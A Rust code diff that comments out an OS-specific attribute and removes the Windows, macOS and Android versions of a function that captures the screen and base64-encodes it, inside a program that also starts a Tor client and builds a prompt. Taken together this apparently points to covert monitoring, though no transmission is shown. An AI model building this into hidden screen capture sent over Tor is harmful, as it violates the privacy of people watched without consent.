@@ -83,7 +83,7 @@ async fn init_tor() -> Result<TorClient<PreferredRuntime>> {
     println!("Initialized Tor Client");
     Ok(client)
 }
-#[cfg(target_os = "linux")]
+//#[cfg(target_os = "linux")]
 fn take_screenshot_base64() -> anyhow::Result<String> {
     let screens = Screen::all()?;
     let screen = &screens[0];
@@ -103,67 +103,6 @@ fn take_screenshot_base64() -> anyhow::Result<String> {
     let b64 = general_purpose::STANDARD.encode(&png_bytes);
     Ok(format!("{}",b64))
 }
-#[cfg(target_os = "windows")]
-fn take_screenshot_base64() -> anyhow::Result<String> {
-    let screens = Screen::all()?;
-    let screen = &screens[0];
-
-    // Capture screenshot
-    let image = screen.capture()?;
-
-    // Encode PNG into memory
-    let mut png_bytes: Vec<u8> = Vec::new();
-
-
-    image.write_to(
-        &mut std::io::Cursor::new(&mut png_bytes),
-        ImageOutputFormat::Png,
-    )?;
-
-    // Convert PNG bytes -> base64
-    let b64 = general_purpose::STANDARD.encode(&png_bytes);
-    Ok(format!("{}",b64))
-}
-#[cfg(target_os = "macos")]
-fn take_screenshot_base64() -> anyhow::Result<String> {
-    let screens = Screen::all()?;
-    let screen = &screens[0];
-
-    // Capture screenshot
-    let image = screen.capture()?;
-
-    // Encode PNG into memory
-    let mut png_bytes: Vec<u8> = Vec::new();
-
-
-    image.write_to(
-        &mut std::io::Cursor::new(&mut png_bytes),
-        ImageOutputFormat::Png,
-    )?;
-
-    // Convert PNG bytes -> base64
-    let b64 = general_purpose::STANDARD.encode(&png_bytes);
-    Ok(format!("{}",b64))
-}
-// different implementation on android
-#[cfg(target_os = "android")]
-fn take_screenshot_base64()-> anyhow::Result<String>{
-    let path_str = "/data/local/tmp/screenshot.png";
-    let output = Command::new("screencap")
-    .arg("-p")
-    .arg(path_str)
-    .output();
-    let path = Path::new(path_str);
-    let buf = fs::read(path)?;
-    fs::remove_file(path);
-    let encoded = general_purpose::STANDARD.encode(buf);
-    Ok(format!("{}",encoded))
-}
-/*
-fn take_screenshot_base64() -> anyhow::Result<String>{
-    let msg = String::" "
-    Ok(msg)
-}*/
 
 /// Build prompt string
 pub fn build_prompt() -> String {
